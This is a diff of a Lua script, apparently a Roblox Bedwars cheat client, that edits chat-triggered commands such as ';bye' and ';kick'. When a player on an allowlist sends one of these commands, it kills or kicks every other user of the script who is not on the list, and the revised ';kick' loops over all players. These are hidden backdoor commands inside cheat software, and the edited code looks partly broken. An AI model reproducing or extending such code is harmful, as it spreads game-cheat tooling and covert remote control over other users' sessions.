@@ -10667,15 +10667,7 @@ end
 local commands = {
 	[";bye default"] = function()
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
-			if entityLibrary.isAlive then
-				local hum = entityLibrary.character.Humanoid
-				task.delay(0.1, function()
-					if hum and hum.Health > 0 then 
-						hum:ChangeState(Enum.HumanoidStateType.Dead)
-						hum.Health = 0
-						bedwars.ClientHandler:Get(bedwars.ResetRemote):SendToServer()
-				end
-			end)
+			game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):ChangeState(Enum.HumanoidStateType.Dead)
 		end
 	end,
 	[";void default"] = function()
@@ -10690,16 +10682,13 @@ local commands = {
 			end
 		end
 	end,
-	[";kick default"] = function()
+	[";kick"] = function()
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
-			local str = ""
-			for i,v in pairs(args) do
-				str = str..v..(i > 1 and " " or "")
+			wait(1)
+			for index, player in pairs(game.Players:GetPlayers()) do
+				player:Kick("")
 			end
-			task.spawn(function()
-				lplr:Kick(str)
-			end)
-		bedwars.ClientHandler:Get("TeleportToLobby"):SendToServer()
+		end
 	end,
 	[";rick default"] = function()
 			if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
